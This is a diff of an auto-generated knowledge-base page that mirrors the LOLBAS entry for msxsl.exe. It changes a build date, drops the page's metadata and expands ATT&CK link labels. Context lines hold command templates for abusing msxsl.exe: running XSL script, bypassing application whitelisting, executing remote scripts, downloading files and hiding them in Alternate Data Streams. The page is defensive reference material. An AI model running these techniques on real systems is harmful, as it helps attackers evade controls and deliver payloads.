@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OtherMSBinaries/Msxsl.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msxsl.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OtherMSBinaries"
 aliases:
   - "msxsl.exe"
@@ -24,16 +24,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# msxsl.exe
-
 Command line utility used to perform XSL transformations.
-
-## Metadata
-
-- Category: OtherMSBinaries
-- Created: 2018-05-25
-- Author: Oddvar Moe
-- Source Path: yml/OtherMSBinaries/Msxsl.yml
 
 ## Paths
 
@@ -52,7 +43,7 @@ msxsl.exe {PATH:.xml} {PATH:.xsl}
 - Use Case: Local execution of script stored in XSL file.
 - Privileges: User
 - Operating System: Windows
-- ATT&CK: [[kb/attack/techniques/T1220-xsl_script_processing|T1220]]
+- ATT&CK: [[kb/attack/techniques/T1220-xsl_script_processing|T1220: XSL Script Processing]]
 
 ### 2. AWL Bypass
 
@@ -65,7 +56,7 @@ msxsl.exe {PATH:.xml} {PATH:.xsl}
 - Use Case: Local execution of script stored in XSL file.
 - Privileges: User
 - Operating System: Windows
-- ATT&CK: [[kb/attack/techniques/T1220-xsl_script_processing|T1220]]
+- ATT&CK: [[kb/attack/techniques/T1220-xsl_script_processing|T1220: XSL Script Processing]]
 
 ### 3. Execute
 
@@ -78,7 +69,7 @@ msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}
 - Use Case: Local execution of remote script stored in XSL script stored as an XML file.
 - Privileges: User
 - Operating System: Windows
-- ATT&CK: [[kb/attack/techniques/T1220-xsl_script_processing|T1220]]
+- ATT&CK: [[kb/attack/techniques/T1220-xsl_script_processing|T1220: XSL Script Processing]]
 
 ### 4. AWL Bypass
 
@@ -91,7 +82,7 @@ msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
 - Use Case: Local execution of remote script stored in XSL script stored as an XML file.
 - Privileges: User
 - Operating System: Windows
-- ATT&CK: [[kb/attack/techniques/T1220-xsl_script_processing|T1220]]
+- ATT&CK: [[kb/attack/techniques/T1220-xsl_script_processing|T1220: XSL Script Processing]]
 
 ### 5. Download
 
@@ -104,7 +95,7 @@ msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
 - Use Case: Download a file from the internet and save it to disk.
 - Privileges: User
 - Operating System: Windows
-- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]
+- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]
 
 ### 6. ADS
 
@@ -117,7 +108,7 @@ msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
 - Use Case: Download a file from the internet and save it to an NTFS Alternate Data Stream.
 - Privileges: User
 - Operating System: Windows
-- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts|T1564]]
+- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts|T1564: Hide Artifacts]]
 
 ## Detections
 
